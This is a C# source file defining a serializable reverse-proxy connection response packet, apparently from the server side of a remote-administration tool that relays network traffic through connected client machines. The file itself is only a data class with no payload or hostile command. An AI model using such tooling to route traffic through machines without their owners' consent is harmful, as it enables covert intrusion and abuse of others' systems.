using System;
using xServer.Core.Networking;
using xServer.Core.Packets;

namespace xServer.Core.ReverseProxy.Packets
{
    [Serializable]
    public class ReverseProxyConnectResponse : IPacket
    {
        public int ConnectionId { get; set; }

        public bool IsConnected { get; set; }

        public long LocalEndPoint { get; set; }

        public int LocalPort { get; set; }

        public string HostName { get; set; }

        public ReverseProxyConnectResponse()
        {
        }

        public ReverseProxyConnectResponse(int connectionId, bool isConnected, long localEndPoint, int localPort)
        {
            this.ConnectionId = connectionId;
            this.IsConnected = isConnected;
            this.LocalEndPoint = localEndPoint;
            this.LocalPort = localPort;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
